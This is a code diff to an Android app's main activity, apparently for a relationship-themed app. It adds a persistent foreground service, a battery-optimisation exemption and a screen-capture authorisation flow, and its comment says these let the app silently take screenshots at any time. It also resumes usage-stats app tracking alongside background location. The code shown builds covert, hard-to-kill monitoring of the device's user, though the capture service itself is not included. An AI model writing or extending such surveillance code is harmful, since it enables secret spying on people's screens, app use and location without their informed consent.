@@ -2,9 +2,13 @@ package xyz.lovestyle.home;
 
 import android.Manifest;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.PowerManager;
+import android.provider.Settings;
 import androidx.work.ExistingPeriodicWorkPolicy;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
@@ -27,7 +31,7 @@ public class MainActivity extends BridgeActivity {
             wv.addJavascriptInterface(new NativeBridge(getApplicationContext()), "ElpisNative");
         }
 
-        // UsageStats 应用追踪
+        // UsageStats 应用追踪（屏幕时间也靠它）——没授权就显式拉起设置页
         tracker = new AppTracker(getApplicationContext());
         if (!tracker.hasPermission()) {
             tracker.openPermissionSettings();
@@ -36,7 +40,13 @@ public class MainActivity extends BridgeActivity {
         }
 
         // 前台服务保活（防止系统后台杀进程）
-        startService(new Intent(this, ForegroundService.class));
+        startForegroundServiceCompat();
+
+        // 请求电池优化白名单（Doze 豁免），进一步防止后台被清
+        requestIgnoreBatteryOptimizations();
+
+        // 屏幕镜像授权：拿到 token 后 ScreenCaptureService 常驻，之后可随时静默截屏
+        maybeRequestScreenCapture();
 
         // WorkManager 轮询通知
         scheduleNotificationWorker();
@@ -59,6 +69,34 @@ public class MainActivity extends BridgeActivity {
         } else {
             requestBackgroundLocationIfNeeded();
         }
+    }
+
+    private void startForegroundServiceCompat() {
+        Intent svc = new Intent(this, ForegroundService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(svc);
+        } else {
+            startService(svc);
+        }
+    }
+
+    private void requestIgnoreBatteryOptimizations() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) return;
+        try {
+            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:" + getPackageName()));
+            startActivity(i);
+        } catch (Exception ignored) {}
+    }
+
+    // 首次/未就绪时拉起投屏授权，用 pref 记录用户是否禁用了自动授权
+    private void maybeRequestScreenCapture() {
+        SharedPreferences sp = getSharedPreferences("elpis_push", MODE_PRIVATE);
+        if (!sp.getBoolean("screencap_enabled", true)) return;
+        if (ScreenCaptureService.isReady()) return;
+        startActivity(new Intent(this, ScreenCapturePermissionActivity.class));
     }
 
     private void requestBackgroundLocationIfNeeded() {
@@ -92,6 +130,15 @@ public class MainActivity extends BridgeActivity {
                 "poll_fyodor",
                 ExistingPeriodicWorkPolicy.KEEP,
                 work);
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        // 用户可能刚从设置页授予了 UsageStats，回到 app 时补启动追踪
+        if (tracker != null && tracker.hasPermission()) {
+            tracker.start();
+        }
     }
 
     @Override
